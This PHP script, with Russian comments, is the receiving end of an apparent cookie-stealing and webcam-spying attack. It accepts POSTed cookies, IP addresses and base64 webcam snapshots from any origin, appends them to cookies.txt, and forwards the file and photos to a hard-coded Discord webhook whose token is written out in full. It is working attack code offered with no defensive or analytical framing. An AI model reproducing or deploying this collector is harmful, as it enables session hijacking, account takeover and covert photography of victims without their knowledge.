<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    if (isset($data['cookies'])) {
        $timestamp = date('Y-m-d H:i:s');
        $ip = $data['ip'] ?? $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        
        $content = "=== Новые данные получены ===\n";
        $content .= "Время: " . $timestamp . "\n";
        $content .= "IP Адрес: " . $ip . "\n";
        $content .= "User Agent: " . $userAgent . "\n";
        $content .= "Cookies:\n" . $data['cookies'] . "\n\n";
        
        // Сохраняем в файл
        file_put_contents('cookies.txt', $content, FILE_APPEND);
        
        // Сохраняем фото с веб-камеры, если оно есть
        if (isset($data['webcam']) && !empty($data['webcam'])) {
            $imageData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $data['webcam']));
            $filename = 'webcam_' . time() . '.jpg';
            file_put_contents($filename, $imageData);
        }
        
        // Отправляем файлы в Discord
        $webhookUrl = 'https://discord.com/api/webhooks/1375196009419898972/gxhjvoZXT56YAmQcZNsjG7AdcvkvmtdCJ5S8JbrK9CoVToRfNdzh8vXZkSER4gQzstrr';
        
        // Создаем CURL запрос
        $ch = curl_init();
        
        // Создаем multipart/form-data
        $boundary = uniqid();
        $delimiter = '-------------' . $boundary;
        
        $postData = '';
        
        // Добавляем сообщение
        $postData .= "--" . $delimiter . "\r\n"
                 . 'Content-Disposition: form-data; name="content"' . "\r\n\r\n"
                 . "Новые данные получены\r\n";
        
        // Добавляем файл с куки
        if (file_exists('cookies.txt')) {
            $postData .= "--" . $delimiter . "\r\n"
                     . 'Content-Disposition: form-data; name="file"; filename="cookies.txt"' . "\r\n"
                     . 'Content-Type: text/plain' . "\r\n\r\n"
                     . file_get_contents('cookies.txt') . "\r\n";
        }
        
        // Добавляем фото с веб-камеры
        if (isset($filename) && file_exists($filename)) {
            $postData .= "--" . $delimiter . "\r\n"
                     . 'Content-Disposition: form-data; name="file"; filename="webcam.jpg"' . "\r\n"
                     . 'Content-Type: image/jpeg' . "\r\n\r\n"
                     . file_get_contents($filename) . "\r\n";
        }
        
        $postData .= "--" . $delimiter . "--\r\n";
        
        // Настраиваем CURL
        curl_setopt($ch, CURLOPT_URL, $webhookUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: multipart/form-data; boundary=' . $delimiter,
            'Content-Length: ' . strlen($postData)
        ]);
        
        // Отправляем запрос
        $response = curl_exec($ch);
        
        // Проверяем на ошибки
        if(curl_errno($ch)) {
            echo json_encode(['success' => false, 'error' => curl_error($ch)]);
        } else {
            echo json_encode(['success' => true]);
        }
        
        curl_close($ch);
        
        // Удаляем временные файлы
        if (isset($filename) && file_exists($filename)) {
            unlink($filename);
        }
    } else {
        echo json_encode(['success' => false, 'error' => 'No cookies data']);
    }
} else {
    echo json_encode(['success' => false, 'error' => 'Invalid request method']);
}
?> 